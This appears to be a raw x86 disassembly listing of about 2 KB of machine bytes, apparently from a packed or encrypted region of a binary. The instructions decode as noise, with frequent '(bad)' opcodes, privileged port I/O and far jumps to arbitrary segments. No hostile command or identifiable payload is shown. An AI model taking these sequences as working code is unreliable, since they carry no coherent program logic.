  41ee7c:	fisubr WORD PTR [ebx-0x5795d165]
  41ee82:	repz mov ah,0x43
  41ee85:	sbb    ebp,DWORD PTR [esi]
  41ee87:	mov    ah,0x24
  41ee89:	enter  0xf9c3,0x6
  41ee8d:	add    BYTE PTR [eax],dh
  41ee8f:	xor    ch,bh
  41ee91:	cmp    eax,0xc4da0993
  41ee96:	lahf   
  41ee97:	lea    edi,[ecx+0x62f84a88]
  41ee9d:	or     al,0x84
  41ee9f:	rcr    DWORD PTR [esi+0x78],0x40
  41eea3:	ins    DWORD PTR es:[edi],dx
  41eea4:	dec    ecx
  41eea5:	fmul   DWORD PTR [esi+0x44]
  41eea8:	shr    DWORD PTR ds:0xb4c6f5ce,0x5f
  41eeaf:	dec    ebx
  41eeb0:	sub    eax,0xb615dc4
  41eeb5:	mov    esi,0x55416312
  41eeba:	cmp    DWORD PTR [edx],edi
  41eebc:	out    dx,al
  41eebd:	cmp    bh,BYTE PTR [edi+0xebe2c11]
  41eec3:	nop
  41eec4:	loopne 0x41ee65
  41eec6:	mov    dx,cs
  41eec9:	xor    al,ch
  41eecb:	and    ah,BYTE PTR [eax-0x1205020c]
  41eed1:	ret    
  41eed2:	popa   
  41eed3:	les    eax,FWORD PTR [esi+0x4a]
  41eed6:	fcmovnu st,st(4)
  41eed8:	jae    0x41eebd
  41eeda:	scas   eax,DWORD PTR es:[edi]
  41eedb:	jnp    0x41eefa
  41eedd:	cmp    BYTE PTR [edi],bh
  41eedf:	sub    ah,BYTE PTR [eax+0x4505c011]
  41eee5:	xchg   ebx,eax
  41eee6:	add    ecx,ebx
  41eee8:	xchg   ecx,eax
  41eee9:	inc    ebp
  41eeea:	test   BYTE PTR [ebx-0x7b05724f],bh
  41eef0:	inc    esi
  41eef1:	jmp    0xea29:0x9d0767a8
  41eef8:	ja     0x41ee92
  41eefa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eefb:	mov    al,0x75
  41eefd:	aam    0x9b
  41eeff:	(bad)  
  41ef00:	leave  
  41ef01:	not    dl
  41ef03:	or     BYTE PTR [ebx+edx*2],ah
  41ef06:	outs   dx,BYTE PTR ds:[esi]
  41ef07:	push   ebx
  41ef08:	daa    
  41ef09:	or     al,BYTE PTR [ebx-0x1ac5762a]
  41ef0f:	shl    DWORD PTR [edi-0x5ef3c0e1],0x5b
  41ef16:	arpl   WORD PTR [ebp+0xa],ax
  41ef19:	mov    ecx,0x9a47b7f9
  41ef1e:	out    dx,al
  41ef1f:	push   ebx
  41ef20:	jp     0x41eee9
  41ef22:	push   edi
  41ef23:	ffree  st(4)
  41ef25:	add    eax,0x7b4391c1
  41ef2a:	xlat   BYTE PTR ds:[ebx]
  41ef2b:	fisttp DWORD PTR [esi+0x12]
  41ef2e:	mov    eax,0x4ba84b78
  41ef33:	add    bh,BYTE PTR [ebp+0x26]
  41ef36:	cmp    dl,BYTE PTR [ecx+0xe]
  41ef39:	inc    edi
  41ef3a:	cmp    DWORD PTR [ecx-0x3e],ebx
  41ef3d:	inc    edi
  41ef3e:	aam    0x3a
  41ef40:	xchg   DWORD PTR [ebp-0xb],edx
  41ef43:	sbb    al,0xc
  41ef45:	test   eax,0x6b247ef
  41ef4a:	je     0x41efc5
  41ef4c:	loope  0x41eede
  41ef4e:	(bad)  
  41ef4f:	out    0x7,eax
  41ef51:	push   edi
  41ef52:	pusha  
  41ef53:	pop    esi
  41ef54:	inc    edi
  41ef55:	fsincos 
  41ef57:	ror    ch,cl
  41ef59:	xor    esp,0x1359caa0
  41ef5f:	lahf   
  41ef60:	add    edx,ecx
  41ef62:	dec    edx
  41ef63:	jbe    0x41efc7
  41ef65:	arpl   bp,bx
  41ef67:	frstor [edi+0x30]
  41ef6a:	sub    BYTE PTR [ebx-0x1f94c3e0],0xac
  41ef71:	xchg   edx,eax
  41ef72:	cmp    eax,0xd3c03130
  41ef77:	pop    eax
  41ef78:	mov    ebp,0x510c2a76
  41ef7d:	loope  0x41ef5e
  41ef7f:	mov    esi,DWORD PTR [eax]
  41ef81:	xor    DWORD PTR [edx],edx
  41ef83:	xchg   ebp,eax
  41ef84:	in     al,dx
  41ef85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef86:	xchg   edi,eax
  41ef87:	add    DWORD PTR [edi+0x383b7237],esi
  41ef8d:	cdq    
  41ef8e:	xchg   dh,al
  41ef90:	jge    0x41ef36
  41ef92:	push   esp
  41ef93:	popf   
  41ef94:	call   0xbe695f
  41ef99:	in     eax,dx
  41ef9a:	jne    0x41efaf
  41ef9c:	jne    0x41efd1
  41ef9e:	adc    DWORD PTR ds:0x63d4772e,ebx
  41efa4:	mov    esi,0x37255ae5
  41efa9:	repz add BYTE PTR [ecx],ch
  41efac:	cli    
  41efad:	jmp    0x41ef5f
  41efaf:	inc    edi
  41efb0:	jno    0x41ef8a
  41efb2:	pop    esp
  41efb3:	add    al,0x9f
  41efb5:	or     esi,DWORD PTR [ecx]
  41efb7:	idiv   eax
  41efb9:	mov    eax,ds:0x82848844
  41efbe:	aas    
  41efbf:	sub    DWORD PTR [edx-0x6206f6],ecx
  41efc5:	aam    0xe2
  41efc7:	xlat   BYTE PTR ds:[ebx]
  41efc8:	jnp    0x41ef5e
  41efca:	(bad)  
  41efcb:	leave  
  41efcc:	jge    0x41f00f
  41efce:	inc    esi
  41efcf:	jge    0x41eff6
  41efd1:	mov    eax,ds:0xe24cb2b5
  41efd6:	(bad)  
  41efd7:	jge    0x41efdb
  41efd9:	loop   0x41f05a
  41efdb:	dec    ecx
  41efdc:	out    0x8e,eax
  41efde:	and    eax,0xf6e89537
  41efe3:	add    bl,dl
  41efe5:	mov    cl,0xa7
  41efe7:	test   DWORD PTR [esi],ebx
  41efe9:	stos   DWORD PTR es:[edi],eax
  41efea:	pop    ds
  41efeb:	popf   
  41efec:	sub    DWORD PTR [edi+0xff29822],eax
  41eff2:	fidiv  WORD PTR [eax+0x31]
  41eff5:	and    dl,BYTE PTR [esi+ebx*2-0x2d]
  41eff9:	outs   dx,BYTE PTR ds:[esi]
  41effa:	call   0xd986:0xc6374ac9
  41f001:	mov    bh,0xdd
  41f003:	leave  
  41f004:	jno    0x41f017
  41f006:	(bad)  
  41f007:	call   0x7a82:0xbb2c5e3f
  41f00e:	out    dx,al
  41f00f:	xor    BYTE PTR [ecx+0x360a6539],cl
  41f015:	es and al,0x85
  41f018:	jae    0x41eff0
  41f01a:	cmp    BYTE PTR [edi-0x74a76e62],al
  41f020:	cmp    DWORD PTR [eax],eax
  41f022:	sub    ecx,DWORD PTR [eax+ebp*2+0x2ebb004e]
  41f029:	jge    0x41eff2
  41f02b:	mov    al,0xcc
  41f02d:	cld    
  41f02e:	cld    
  41f02f:	xor    bh,0xe2
  41f032:	and    bl,BYTE PTR [esi-0x22]
  41f035:	gs pushf 
  41f037:	and    ebp,DWORD PTR [edx-0x61]
  41f03a:	inc    eax
  41f03b:	ins    DWORD PTR es:[edi],dx
  41f03c:	icebp  
  41f03d:	cmp    dl,BYTE PTR [ecx+edi*2]
  41f040:	aas    
  41f041:	jmp    0xaef:0xa7047280
  41f048:	dec    ebx
  41f049:	push   0x2521d742
  41f04e:	push   ebx
  41f04f:	fst    st(1)
  41f051:	icebp  
  41f052:	fdiv   DWORD PTR [edi+edx*4-0x65]
  41f056:	add    BYTE PTR [esi],bh
  41f058:	cmp    al,0x44
  41f05a:	pop    ecx
  41f05b:	inc    ebx
  41f05c:	jmp    0x46aa:0x54c21272
  41f063:	(bad)
  41f067:	adc    dl,0xb8
  41f06a:	mov    esi,0x81e1d7c9
  41f06f:	das    
  41f070:	into   
  41f071:	cs addr16 in al,dx
  41f074:	mov    al,ds:0x3802995c
  41f079:	push   esi
  41f07a:	(bad)  
  41f07b:	inc    ebx
  41f07c:	mov    esi,0xe9a742e4
  41f081:	in     al,0xcf
  41f083:	ins    DWORD PTR es:[edi],dx
  41f084:	xor    BYTE PTR [esi+0xb],cl
  41f087:	push   ebp
  41f088:	sub    ecx,ecx
  41f08a:	enter  0x86ff,0x35
  41f08e:	xor    DWORD PTR [esi-0x734371ba],0x4364a4bd
  41f098:	int3   
  41f099:	and    BYTE PTR [edx-0x5],bl
  41f09c:	aaa    
  41f09d:	adc    eax,0xee5cbc18
  41f0a2:	arpl   WORD PTR [eax+0x62],bp
  41f0a5:	test   eax,0xc0ba2010
  41f0aa:	push   ss
  41f0ab:	fs jo  0x41f051
  41f0ae:	inc    ebx
  41f0af:	daa    
  41f0b0:	jle    0x41f060
  41f0b2:	lea    ebx,[esi]
  41f0b4:	mov    al,ds:0x2ea3580d
  41f0b9:	push   esi
  41f0ba:	ja     0x41f06d
  41f0bc:	ds mov bh,0x42
  41f0bf:	test   eax,0x459c5930
  41f0c4:	xchg   esp,eax
  41f0c5:	jno    0x41f0bc
  41f0c7:	mov    eax,ds:0x555fb767
  41f0cc:	cmp    BYTE PTR [ecx],cl
  41f0ce:	ins    DWORD PTR es:[edi],dx
  41f0cf:	pop    edi
  41f0d0:	inc    esi
  41f0d1:	lea    ebx,[ecx+0x0]
  41f0d4:	or     edi,edi
  41f0d6:	gs in  eax,0xa7
  41f0d9:	mov    BYTE PTR [edi+0x66],cl
  41f0dc:	fs jne 0x41f0d4
  41f0df:	lds    edi,FWORD PTR [edi]
  41f0e1:	out    0x9b,eax
  41f0e3:	scas   al,BYTE PTR es:[edi]
  41f0e4:	xlat   BYTE PTR ds:[ebx]
  41f0e5:	shr    DWORD PTR [esi-0x7f],1
  41f0e8:	mov    ch,0xdd
  41f0ea:	add    al,0x78
  41f0ec:	or     dh,BYTE PTR [ecx+0x38]
  41f0ef:	(bad)  
  41f0f0:	fistp  QWORD PTR [ebp-0x46e7cff4]
  41f0f6:	icebp  
  41f0f7:	cmp    al,BYTE PTR [edi+0x6]
  41f0fa:	adc    al,BYTE PTR [esi+0x7e]
  41f0fd:	adc    DWORD PTR [ebx-0x18e2317d],0xdd24a16a
  41f107:	pop    edx
  41f108:	xlat   BYTE PTR ds:[ebx]
  41f109:	push   0xaf59861
  41f10e:	repnz data16 xlat BYTE PTR ds:[ebx]
  41f111:	sub    ch,0x15
  41f114:	push   ebp
  41f115:	sbb    eax,0x71e35bb9
  41f11a:	and    DWORD PTR [edi-0x36],esp
  41f11d:	aad    0xec
  41f11f:	pop    edi
  41f120:	sub    al,0xd0
  41f122:	mov    ds:0x98c09f84,al
  41f127:	adc    dh,ah
  41f129:	test   eax,0x96dd4164
  41f12e:	sbb    ecx,DWORD PTR [edx]
  41f130:	cwde   
  41f131:	push   ds
  41f132:	lds    esp,FWORD PTR [ecx-0x7142f01e]
  41f138:	pop    eax
  41f139:	leave  
  41f13a:	rol    DWORD PTR [ebp+eax*8-0x6a736f3e],0xd6
  41f142:	sub    DWORD PTR [esi-0xe9054fe],ebp
  41f148:	add    ch,BYTE PTR [esi-0xc]
  41f14b:	out    dx,al
  41f14c:	outs   dx,BYTE PTR ds:[esi]
  41f14d:	jecxz  0x41f17e
  41f14f:	push   ds
  41f150:	adc    DWORD PTR [eax],edx
  41f152:	repnz mov esp,0x15f93f19
  41f158:	jmp    0x41f1bf
  41f15a:	imul   esi,edi,0xc7f5b0a0
  41f160:	(bad)  
  41f161:	pop    edi
  41f162:	push   eax
  41f163:	mov    dl,0x6e
  41f165:	fbld   TBYTE PTR [ebp-0x19]
  41f168:	cmp    ch,ah
  41f16a:	ret    0xa333
  41f16d:	das    
  41f16e:	mov    ds:0xd7b5db50,al
  41f173:	popf   
  41f174:	jne    0x41f1ea
  41f176:	(bad)  
  41f177:	mov    WORD PTR cs:[esi-0x53417baf],es
  41f17e:	in     eax,dx
  41f17f:	push   cs
  41f180:	inc    ebx
  41f181:	imul   ebp,DWORD PTR [ebp+0x53a83720],0x13d578fa
  41f18b:	es jae 0x41f189
  41f18e:	sbb    BYTE PTR [eax],bl
  41f190:	or     dh,BYTE PTR [ebp+0x17]
  41f193:	lahf   
  41f194:	add    DWORD PTR [edi-0x7d],ebx
  41f197:	xor    BYTE PTR [edx+0x3a869b1c],ah
  41f19d:	and    BYTE PTR [esi+0x49],0x5
  41f1a1:	(bad)  ss:[ebp+0x2b]
  41f1a5:	mov    esi,0x5abfe57c
  41f1aa:	dec    edi
  41f1ab:	test   BYTE PTR ds:0xc37275bf,ah
  41f1b1:	imul   esi,ebp,0x36
  41f1b4:	xor    BYTE PTR [eax+ebp*1+0x7663b1fc],ah
  41f1bb:	sahf   
  41f1bc:	in     al,0x67
  41f1be:	dec    ebp
  41f1bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1c0:	adc    cl,BYTE PTR [eax-0x786afbe7]
  41f1c6:	cs cwde 
  41f1c8:	push   cs
  41f1c9:	loop   0x41f1be
  41f1cb:	mov    dl,0x5f
  41f1cd:	or     al,0x5b
  41f1cf:	mov    edi,0x5dfec610
  41f1d4:	(bad)  
  41f1d5:	aas    
  41f1d6:	and    al,0xd6
  41f1d8:	push   edi
  41f1d9:	xchg   ebp,eax
  41f1da:	out    0xf6,eax
  41f1dc:	lahf   
  41f1dd:	or     DWORD PTR cs:[edx+0x501238b9],esi
  41f1e4:	jge    0x41f227
  41f1e6:	out    0xec,al
  41f1e8:	cmp    eax,0x453489d9
  41f1ed:	test   eax,0x73b26002
  41f1f2:	daa    
  41f1f3:	in     eax,dx
  41f1f4:	test   eax,0xf62e640b
  41f1f9:	aam    0xcd
  41f1fb:	mov    edx,DWORD PTR [esi]
  41f1fd:	aad    0x5c
  41f1ff:	mov    edi,0x7197925d
  41f204:	xchg   edx,eax
  41f205:	adc    eax,DWORD PTR ds:0x7630d80
  41f20b:	xchg   ebp,eax
  41f20c:	nop    DWORD PTR [eax]
  41f20f:	retf   0xce79
  41f212:	xchg   ebx,eax
  41f213:	dec    ecx
  41f214:	xchg   esp,eax
  41f215:	popf   
  41f216:	arpl   WORD PTR [edi],bx
  41f218:	repnz popf 
  41f21a:	push   es
  41f21b:	xor    ch,dl
  41f21d:	test   al,0x58
  41f21f:	push   ecx
  41f220:	xchg   DWORD PTR [ebp-0x37],eax
  41f223:	jno    0x41f1b9
  41f225:	sti    
  41f226:	pushf  
  41f227:	pop    ebp
  41f228:	outs   dx,BYTE PTR ds:[esi]
  41f229:	jmp    0x41f215
  41f22b:	push   esi
  41f22c:	pop    ebp
  41f22d:	mov    ds:0x22145ab1,al
  41f232:	jo     0x41f1db
  41f234:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41f236:	aam    0xe
  41f238:	cdq    
  41f239:	lea    eax,[ecx]
  41f23b:	ret    0x3ec5
  41f23e:	jp     0x41f25d
  41f240:	test   DWORD PTR [ebp+eiz*4+0x3cdefc15],ecx
  41f247:	mov    bl,0x2a
  41f249:	sub    DWORD PTR [edi],0xffffffd3
  41f24c:	fld    DWORD PTR [ecx+0x17670cff]
  41f252:	jnp    0x41f1d5
  41f254:	inc    ebp
  41f255:	adc    eax,eax
  41f257:	(bad)  
  41f258:	call   0xf2a1f729
  41f25d:	outs   dx,BYTE PTR ds:[esi]
  41f25e:	out    dx,al
  41f25f:	lods   al,BYTE PTR ds:[esi]
  41f260:	pop    esp
  41f261:	push   edx
  41f262:	mov    cl,0x41
  41f264:	call   0xf77:0x75cbb42a
  41f26b:	sub    eax,0x82526234
  41f270:	int    0x23
  41f272:	loopne 0x41f211
  41f274:	arpl   WORD PTR [edi+ebx*1+0x5],cx
  41f278:	inc    ecx
  41f279:	cmp    al,0xdf
  41f27b:	sub    al,0xe2
  41f27d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f27e:	and    ch,bl
  41f280:	stc    
  41f281:	fist   WORD PTR [ecx+0x4d8a576f]
  41f287:	xchg   esi,eax
  41f288:	dec    ebp
  41f289:	cmp    cl,dh
  41f28b:	mov    ecx,0xd67570a3
  41f290:	lods   al,BYTE PTR ds:[esi]
  41f291:	sub    ecx,DWORD PTR [ebp-0x3]
  41f294:	jmp    0x1ddcd97f
  41f299:	mov    edi,0xa68ae99b
  41f29e:	les    edi,FWORD PTR [ebp+0xb9a933c]
  41f2a4:	in     eax,dx
  41f2a5:	sbb    ch,dh
  41f2a7:	or     ah,ch
  41f2a9:	mov    ds:0x3b7d7b63,al
  41f2ae:	jecxz  0x41f315
  41f2b0:	mov    bl,0x75
  41f2b2:	in     al,0x59
  41f2b4:	fbstp  TBYTE PTR [edx+ebx*4+0x64]
  41f2b8:	sbb    edx,DWORD PTR [ebx]
  41f2ba:	gs stos BYTE PTR es:[edi],al
  41f2bc:	dec    ebx
  41f2bd:	aad    0x35
  41f2bf:	adc    eax,0xb02262ad
  41f2c4:	gs ins DWORD PTR es:[edi],dx
  41f2c6:	(bad)  
  41f2c7:	pop    ecx
  41f2c8:	int3   
  41f2c9:	arpl   cx,ax
  41f2cb:	lock cwde 
  41f2cd:	and    BYTE PTR [edi-0x64198e9b],dl
  41f2d3:	mov    esi,0xff75bd05
  41f2d8:	and    al,BYTE PTR [ecx+eiz*2+0x38cdf4fa]
  41f2df:	sub    ch,ah
  41f2e1:	sub    al,0x93
  41f2e3:	fsub   st(1),st
  41f2e5:	dec    edx
  41f2e6:	(bad)  
  41f2e7:	push   ds
  41f2e8:	mov    esi,eax
  41f2ea:	cmp    eax,0x9632d69b
  41f2ef:	or     bl,dh
  41f2f1:	fnstenv [ebx-0x11722c11]
  41f2f7:	sub    eax,0x18e25e92
  41f2fc:	push   esp
  41f2fd:	lds    esp,FWORD PTR [eax]
  41f2ff:	push   ebp
  41f300:	cmp    al,0xcc
  41f302:	mov    dh,0x1
  41f304:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f305:	jmp    0xf8dae65e
  41f30a:	or     ebx,DWORD PTR [edx]
  41f30c:	sub    eax,0xfb6c4921
  41f311:	repz push ss
  41f313:	inc    ebx
  41f314:	sti    
  41f315:	sbb    ecx,edi
  41f317:	and    al,0x79
  41f319:	pop    edx
  41f31a:	sub    dh,0xfa
  41f31d:	call   0xccd3:0x6cd5887a
  41f324:	leave  
  41f325:	mov    BYTE PTR [ecx],dh
  41f327:	mov    ds:0xdc73d678,eax
  41f32c:	xlat   BYTE PTR ds:[ebx]
  41f32d:	inc    ebx
  41f32e:	mov    eax,ds:0xed0031a7
  41f333:	fstp   DWORD PTR [edi-0xfe5d5b5]
  41f339:	or     al,0x58
  41f33b:	sub    bl,al
  41f33d:	pushf  
  41f33e:	fisttp QWORD PTR [ebp-0x71827489]
  41f344:	(bad)  
  41f345:	xor    al,0x0
  41f347:	arpl   WORD PTR ds:0xe272ccea,ax
  41f34d:	dec    edx
  41f34e:	retf   0x9f3f
  41f351:	jp     0x41f339
  41f353:	outs   dx,BYTE PTR ds:[esi]
  41f354:	mov    esp,cs
  41f356:	bound  esp,QWORD PTR [edx+0x19]
  41f359:	(bad)  
  41f35a:	mov    al,ds:0x57633f6f
  41f35f:	cdq    
  41f360:	and    al,0x77
  41f362:	mov    bh,0xae
  41f364:	dec    esi
  41f365:	add    DWORD PTR ds:0x6f93c58f,esp
  41f36b:	sar    bl,0x7c
  41f36e:	dec    esi
  41f36f:	adc    BYTE PTR [eax-0x61117132],ch
  41f375:	cwde   
  41f376:	push   esp
  41f377:	xor    BYTE PTR [edi+0x17818c1e],cl
  41f37d:	sub    ebx,DWORD PTR [esi-0x62eccdf0]
  41f383:	jb     0x41f3a2
  41f385:	stc    
  41f386:	inc    ecx
  41f387:	cwde   
  41f388:	scas   al,BYTE PTR es:[edi]
  41f389:	pop    eax
  41f38a:	lds    ebp,FWORD PTR [esi-0x3f1b0eac]
  41f390:	std    
  41f391:	mov    esp,0x43e8df2a
  41f396:	pop    ss
  41f397:	and    BYTE PTR [esi+edi*1],0xf8
  41f39b:	loope  0x41f3b4
  41f39d:	mov    edx,0xe29b28e7
  41f3a2:	push   ds
  41f3a3:	mov    ds:0xdc2d0643,eax
  41f3a8:	add    ch,ah
  41f3aa:	lods   al,BYTE PTR ds:[esi]
  41f3ab:	sub    al,0xd5
  41f3ae:	push   ecx
  41f3af:	out    dx,eax
  41f3b0:	pusha  
  41f3b1:	and    eax,0x5c550baa
  41f3b6:	in     al,0x9
  41f3b8:	mov    ebp,0x7a31050e
  41f3bd:	inc    ecx
  41f3be:	lods   al,BYTE PTR ds:[esi]
  41f3bf:	mov    ah,0x88
  41f3c1:	xchg   ebx,eax
  41f3c2:	fs cli 
  41f3c4:	sub    al,0x33
  41f3c6:	sub    dh,ch
  41f3c8:	clc    
  41f3c9:	push   ds
  41f3ca:	inc    edi
  41f3cb:	ss xchg ebp,eax
  41f3cd:	mov    ah,0x71
  41f3cf:	cmp    ah,dh
  41f3d1:	mov    WORD PTR [ebx-0x52],gs
  41f3d4:	lock mov cl,0xba
  41f3d7:	sahf   
  41f3d8:	pushf  
  41f3d9:	icebp  
  41f3da:	icebp  
  41f3db:	jp     0x41f387
  41f3dd:	xchg   edx,eax
  41f3de:	popa   
  41f3df:	aaa    
  41f3e0:	mov    bl,0xea
  41f3e2:	leave  
  41f3e3:	div    DWORD PTR [esi-0x15155a6]
  41f3e9:	mov    ss,edi
  41f3eb:	fidiv  DWORD PTR [ecx-0x2c]
  41f3ee:	imul   esi,DWORD PTR [edi+0x3ee33700],0x48326c1
  41f3f8:	in     al,dx
  41f3f9:	or     al,0xab
  41f3fb:	xchg   di,ax
  41f3fd:	and    al,0xa6
  41f3ff:	dec    ecx
  41f400:	sbb    ch,BYTE PTR [ebx-0x15]
  41f403:	inc    ebx
  41f404:	push   edx
  41f405:	mov    dl,al
  41f407:	mov    ds:0x2ec4e554,eax
  41f40c:	and    DWORD PTR [ecx+0x66f03f1e],eax
  41f412:	cwde   
  41f413:	mov    WORD PTR [edi+ebx*2],gs
  41f416:	mov    ch,0x32
  41f418:	push   0x6eff68e2
  41f41d:	lahf   
  41f41e:	cwde   
  41f41f:	xlat   BYTE PTR ds:[ebx]
  41f420:	sub    eax,0x409549fa
  41f425:	or     eax,edx
  41f427:	nop
  41f428:	push   eax
  41f429:	pop    edi
  41f42a:	inc    ebp
  41f42b:	gs pop es
  41f42d:	or     esp,DWORD PTR [eax]
  41f42f:	test   eax,0xb52d4d5f
  41f434:	fisub  WORD PTR ds:0xd9d71c66
  41f43a:	mov    eax,ds:0xf69ed273
  41f43f:	add    eax,0xf5e1bfd7
  41f444:	cmp    eax,0x809e56a1
  41f449:	lea    eax,[ebp-0x59]
  41f44c:	ds stos DWORD PTR es:[edi],eax
  41f44e:	xchg   edi,eax
  41f44f:	mov    gs,WORD PTR [eax]
  41f451:	inc    esi
  41f452:	xchg   esi,eax
  41f453:	add    eax,0xffb09e85
  41f458:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f459:	mov    eax,ds:0xf6305463
  41f45e:	cmc    
  41f45f:	or     al,0x7
  41f461:	fidiv  DWORD PTR ds:0x672f099d
  41f467:	add    ah,0x48
  41f46a:	clc    
  41f46b:	addr16 push ebx
  41f46d:	pop    ecx
  41f46e:	mov    edx,0x32387c35
  41f473:	dec    esp
  41f474:	pop    ds
  41f475:	or     eax,0x56a62d49
  41f47a:	add    eax,0x679d264
  41f47f:	mov    bl,0x28
  41f481:	xchg   edi,eax
  41f482:	test   al,0xe2
  41f484:	cwde   
  41f485:	or     al,0xca
  41f487:	xor    eax,eax
  41f489:	jae    0x41f4b0
  41f48b:	ret    
  41f48c:	dec    esi
  41f48d:	xchg   DWORD PTR ds:0x68b4ab23,esi
  41f493:	sbb    edx,edx
  41f495:	mov    ds:0x41f9ae3f,eax
  41f49a:	pop    es
  41f49b:	stos   DWORD PTR es:[edi],eax
  41f49c:	sbb    DWORD PTR [edx-0x6b3986dc],edx
  41f4a2:	jno    0x41f481
  41f4a4:	lahf   
  41f4a5:	ds (bad) 
  41f4a8:	mov    ecx,0x1f27e10
  41f4ad:	stc    
  41f4ae:	sub    bl,bl
  41f4b0:	sub    edi,esi
  41f4b2:	dec    ebp
  41f4b3:	cdq    
  41f4b4:	mov    ecx,eax
  41f4b6:	xlat   BYTE PTR ds:[ebx]
  41f4b7:	sub    al,0x15
  41f4b9:	out    0x16,al
  41f4bb:	pop    esp
  41f4bc:	sub    edx,DWORD PTR [esi]
  41f4be:	cmp    DWORD PTR [eax],ecx
  41f4c0:	retf   
  41f4c1:	stos   DWORD PTR es:[edi],eax
  41f4c2:	repnz mov bl,0xaa
  41f4c5:	js     0x41f492
  41f4c7:	pop    esi
  41f4c8:	and    DWORD PTR [eax],edi
  41f4ca:	enter  0xe92f,0x88
  41f4ce:	pop    edi
  41f4cf:	dec    edx
  41f4d0:	(bad)  
  41f4d1:	imul   edi,DWORD PTR [edi+0x2e],0x93e42361
  41f4d8:	inc    edi
  41f4d9:	out    dx,eax
  41f4da:	out    0x1e,eax
  41f4dc:	call   0xf047:0x50dc87c6
  41f4e3:	xchg   BYTE PTR [ebp-0x4871dcea],dh
  41f4e9:	pop    ecx
  41f4ea:	add    eax,DWORD PTR [edi+0x43]
  41f4ed:	fmul   QWORD PTR ds:0x6969c6dc
  41f4f3:	in     eax,dx
  41f4f4:	shl    DWORD PTR [ebp-0x43dd8c87],cl
  41f4fa:	dec    edi
  41f4fb:	jns    0x41f575
  41f4fd:	retf   0xc6df
  41f500:	aad    0xa9
  41f502:	add    al,0x96
  41f504:	or     DWORD PTR [edi-0x306c3f42],esp
  41f50a:	xchg   esi,eax
  41f50b:	pop    esp
  41f50c:	adc    DWORD PTR [ecx+ecx*4-0xf46b512],eax
  41f513:	inc    esp
  41f514:	jmp    0x85cc20b1
  41f519:	add    eax,0xf2db0f8a
  41f51e:	(bad)  
  41f51f:	mov    ecx,0x57cb2c00
  41f524:	pandn  mm4,mm6
  41f527:	ret    
  41f528:	fxch   st(3)
  41f52a:	mov    ebx,0xd8f65dbc
  41f52f:	loopne 0x41f4dd
  41f531:	jp     0x41f590
  41f533:	mov    ss,WORD PTR [edi-0x7e56beeb]
  41f539:	cld    
  41f53a:	fwait
  41f53b:	cs ins BYTE PTR es:[edi],dx
  41f53d:	mov    ecx,0xbd4c9c2a
  41f542:	bound  esp,QWORD PTR [eax+edx*2]
  41f545:	xchg   ecx,eax
  41f546:	sbb    DWORD PTR [edx-0x70d22a26],edi
  41f54c:	dec    edx
  41f54d:	ret    0x2c2a
  41f550:	je     0x41f5c2
  41f552:	ss adc eax,0x65c94fc7
  41f558:	icebp  
  41f559:	jae    0x41f5a4
  41f55b:	aad    0xd8
  41f55d:	rcl    BYTE PTR ds:0x77dcffe5,1
  41f563:	lahf   
  41f564:	sbb    al,0xd4
  41f566:	cdq    
  41f567:	cmp    eax,0xc5e56d64
  41f56c:	loopne 0x41f55a
  41f56e:	fistp  WORD PTR [ebx]
  41f570:	push   DWORD PTR [edx-0x2b]
  41f573:	jne    0x41f541
  41f575:	fcmovne st,st(2)
  41f577:	push   ds
  41f578:	sub    esi,ecx
  41f57a:	inc    DWORD PTR [ebp-0x29bca41b]
  41f580:	call   0xb9ce:0xa463eb0
  41f587:	mov    al,ds:0x9e55c600
  41f58c:	sbb    al,0x85
  41f58e:	inc    ebp
  41f58f:	and    esi,0x9766d2a7
  41f595:	push   ss
  41f596:	in     eax,dx
  41f597:	in     eax,dx
  41f598:	mov    ecx,0x2ac1c65f
  41f59d:	sbb    ah,BYTE PTR [eax+eiz*2]
  41f5a0:	mov    al,ds:0x7b196bcb
  41f5a5:	add    eax,0xc73f9c03
  41f5aa:	rol    edi,cl
  41f5ac:	into   
  41f5ad:	fcom   QWORD PTR [esi+ebp*8]
  41f5b0:	int    0xed
  41f5b2:	jge    0x41f5c1
  41f5b4:	mov    ebx,0x86fa4
  41f5b9:	js     0x41f5e8
  41f5bb:	rol    BYTE PTR [ecx+0x7f],1
  41f5be:	inc    esp
  41f5bf:	jmp    0x4a62bd3e
  41f5c4:	dec    edi
  41f5c5:	push   edi
  41f5c6:	cmc    
  41f5c7:	inc    esi
  41f5c8:	mov    ?,WORD PTR [eiz*1+0x5adabe72]
  41f5cf:	sbb    BYTE PTR [ebx-0x1d],ah
  41f5d2:	xchg   ecx,eax
  41f5d3:	fimul  WORD PTR [ebx-0x591dcbb9]
  41f5d9:	push   ds
  41f5da:	test   eax,0xece51eb2
  41f5df:	into   
  41f5e0:	adc    BYTE PTR [eax+esi*2],0x98
  41f5e4:	dec    edx
  41f5e5:	sbb    ch,dl
  41f5e7:	mov    cx,sp
  41f5ea:	dec    ecx
  41f5eb:	test   eax,0x25445f76
  41f5f0:	rcr    bl,cl
  41f5f2:	enter  0x5aaf,0xd0
  41f5f6:	pop    esp
  41f5f7:	push   eax
  41f5f8:	push   0x215b32e6
  41f5fd:	xchg   esp,eax
  41f5fe:	add    eax,0x663c3662
  41f603:	jno    0x41f605
  41f605:	nop
  41f606:	sar    BYTE PTR [edi+0x4f],1
  41f609:	push   cs
  41f60a:	and    bx,WORD PTR [ebp+0x5806a7ef]
  41f611:	mov    ds:0xf5fe078a,eax
  41f616:	popa   
  41f617:	mul    DWORD PTR [edx-0x5440ffdc]
  41f61d:	sub    DWORD PTR [ebx+0x1ffcbfdd],edi
  41f623:	sub    ebp,DWORD PTR [edi-0x53cdf924]
  41f629:	mov    DWORD PTR [ebp+0x46d0a699],ebx
  41f62f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f630:	mov    dl,0x3c
  41f632:	outs   dx,BYTE PTR fs:[esi]
  41f634:	mov    edi,0x9d76d8a2
  41f639:	push   edi
  41f63a:	test   BYTE PTR [esi+edx*4],dl
  41f63d:	mov    dl,0x9b
  41f63f:	rcr    BYTE PTR [edx],1
  41f641:	adc    dh,ch
  41f643:	imul   ecx,DWORD PTR [ebx],0xffffffe5
